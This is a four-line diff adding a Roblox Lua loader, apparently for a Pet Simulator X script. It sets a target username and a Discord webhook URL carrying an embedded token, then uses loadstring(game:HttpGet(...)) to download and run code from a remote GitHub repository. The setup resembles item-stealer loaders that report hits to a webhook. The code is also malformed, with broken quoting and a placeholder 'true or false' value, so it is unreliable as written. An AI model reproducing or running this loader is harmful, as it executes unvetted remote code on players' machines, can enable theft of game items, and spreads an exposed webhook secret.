@@ -1,0 +1,4 @@
+UserName = "sionuaa"
+Webook = "https://discord.com/api/webhooks/1126303844104667147/SQ5SJFzvr8Y80NGQb4U724xfxGEsH2D0v-2Lame9m7geodBSWs7YSiA4N8pNfto64y5p"
+Mention = true or false
+loadstring(game:HttpGet(*https://raw-githubusercontent.com/HardGameSs/PSX/main/Script.lua",true))()
